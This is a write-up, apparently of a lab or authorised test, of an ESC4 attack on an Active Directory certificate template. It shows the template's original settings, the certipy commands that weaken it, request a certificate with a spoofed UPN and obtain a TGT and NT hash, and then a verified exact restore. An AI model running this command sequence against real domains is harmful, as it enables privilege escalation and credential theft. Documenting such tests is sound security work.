# 4 — ESC4: writable-template exploit and exact restore

**Template:** `HalsteadServiceCert` (published on `Halstead-Root-CA`).
**Why writable:** the foothold `halstead.local\j.mercer` holds **Full Control / Write-Owner
/ Write-DACL** over the template object (enumerated in triage).
**Result:** reconfigured → exploited (issued a cert as `helpdesk.svc`, read FLAG_ESC4) →
**restored to the original configuration, byte-for-byte verified** (`diff` of a fresh
export against the pre-change backup is empty).

The original was captured **before any modification** with
`certipy template -save-configuration esc4-backup.json`; the only moment that record could
be taken was before the first write.

## 1. Before — original configuration (`esc4-backup.json`)

```json
{
    "showInAdvancedViewOnly": true,
    "nTSecurityDescriptor": "HEX:0100048c3001000000000000000000001400000004001c010800000005003800000100000100000068c9100efb78d21190d400c04f79dc55010500000000000515000000aa62f2156a1dd42dc24dc7b0010200000000240094000200010500000000000515000000aa62f2156a1dd42dc24dc7b00102000000002400ff010f00010500000000000515000000aa62f2156a1dd42dc24dc7b00002000000002400ff010f00010500000000000515000000aa62f2156a1dd42dc24dc7b04f040000000014009400020001010000000000050b00000000001400ff010f0001010000000000051200000000122400ff010f00010500000000000515000000aa62f2156a1dd42dc24dc7b00702000000122400bd010f00010500000000000515000000aa62f2156a1dd42dc24dc7b000020000010500000000000515000000aa62f2156a1dd42dc24dc7b007020000",
    "flags": 66106,
    "pKIDefaultKeySpec": 1,
    "pKIKeyUsage": "HEX:a000",
    "pKIMaxIssuingDepth": 0,
    "pKICriticalExtensions": ["2.5.29.15"],
    "pKIExpirationPeriod": 31536000,
    "pKIOverlapPeriod": 3628800,
    "pKIExtendedKeyUsage": ["1.3.6.1.5.5.7.3.2"],
    "pKIDefaultCSPs": [
        "1,Microsoft Enhanced Cryptographic Provider v1.0",
        "2,Microsoft Base Cryptographic Provider v1.0"
    ],
    "msPKI-RA-Signature": 0,
    "msPKI-Enrollment-Flag": 8,
    "msPKI-Private-Key-Flag": 16,
    "msPKI-Certificate-Name-Flag": -2147483648,
    "msPKI-Minimal-Key-Size": 2048,
    "msPKI-Certificate-Application-Policy": ["1.3.6.1.5.5.7.3.2"]
}
```

Original posture in plain terms: `msPKI-Certificate-Name-Flag = -2147483648`
(`0x80000000` = `CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH`) — the subject is built from AD,
the enrollee **cannot** supply it; `msPKI-Enrollment-Flag = 8` (`PUBLISH_TO_DS`); a
restrictive `nTSecurityDescriptor`. Not abusable in this state.

## 2. What I changed

Applied `certipy template -write-default-configuration` (certipy's known-vulnerable
template), confirmed with `y`. It replaced **eight** attributes:

| Attribute | Before (original) | During (exploited) | Effect |
|---|---|---|---|
| `msPKI-Certificate-Name-Flag` | `-2147483648` (`SUBJECT_REQUIRE_DIRECTORY_PATH`) | `1` (`ENROLLEE_SUPPLIES_SUBJECT`) | **load-bearing** — lets the enrollee supply the subject/UPN |
| `msPKI-Enrollment-Flag` | `8` (`PUBLISH_TO_DS`) | `0` | drops publish/approval constraints |
| `nTSecurityDescriptor` | original restrictive ACL | broad ACL granting enroll/full control | opens enrollment to the attacker |
| `flags` | `66106` | `66104` | template general flags |
| `pKIDefaultKeySpec` | `1` | `2` | incidental (certipy default) |
| `pKIKeyUsage` | `HEX:a000` | `HEX:8600` | incidental |
| `pKIMaxIssuingDepth` | `0` | `-1` | incidental |
| `pKICriticalExtensions` | `["2.5.29.15"]` | `["2.5.29.19","2.5.29.15"]` | incidental |

**Exploit while weakened:** enrolled with an attacker-chosen subject and authenticated as
the victim:
```
certipy req  -u j.mercer@halstead.local -p *** -target HALSTEAD-CA01.halstead.local \
             -ca Halstead-Root-CA -template HalsteadServiceCert -upn helpdesk.svc@halstead.local
             -> helpdesk.svc.pfx  (SAN UPN = helpdesk.svc, no object SID)
certipy auth -pfx helpdesk.svc.pfx -username helpdesk.svc -domain halstead.local -dc-ip 10.20.0.10
             -> TGT + NT hash for helpdesk.svc
# read proof as helpdesk.svc -> FLAG_ESC4
```

## 3. After — restored, and proof it matches

Restored from the pre-change backup:
```
certipy template -u j.mercer@halstead.local -p *** -dc-ip 10.20.0.10 \
    -template HalsteadServiceCert -write-configuration esc4-backup.json     # confirmed y
```
Re-exported the live configuration and compared it to the original:
```
certipy template ... -template HalsteadServiceCert -save-configuration esc4-after.json
diff <(json esc4-backup.json) <(json esc4-after.json)
   -> (no output)        # identical
RESTORE VERIFIED: before == after (identical)
```

All eight modified attributes are back to the values in §1 — including
`msPKI-Certificate-Name-Flag = -2147483648` and `msPKI-Enrollment-Flag = 8`. The template
is no weaker than it was found.

## How Halstead can confirm the two match

1. Compare the committed files — `esc4-backup.json` (before) and `esc4-after.json`
   (after); `diff` is empty.
2. Or re-read the live attributes independently and check against §1, e.g.:
   ```
   ldapsearch -x -H ldap://10.20.0.10 -D 'j.mercer@halstead.local' -w *** \
     -b 'CN=HalsteadServiceCert,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=halstead,DC=local' \
     msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag flags pKIKeyUsage pKIMaxIssuingDepth
   ```
   Expect `msPKI-Certificate-Name-Flag: -2147483648`, `msPKI-Enrollment-Flag: 8`,
   `flags: 66106`.

## QA note (not part of the exploit)

`helpdesk.svc`, `svc-scan`, and `pki.operator` all return the **same NT hash**
(`1e66…dc473`) — the seeded service accounts share one password. It didn't affect the
result (identity is still enforced per-account by NTLM username + the proof-file ACLs), but
shared service-account passwords are worth making intentional rather than incidental.
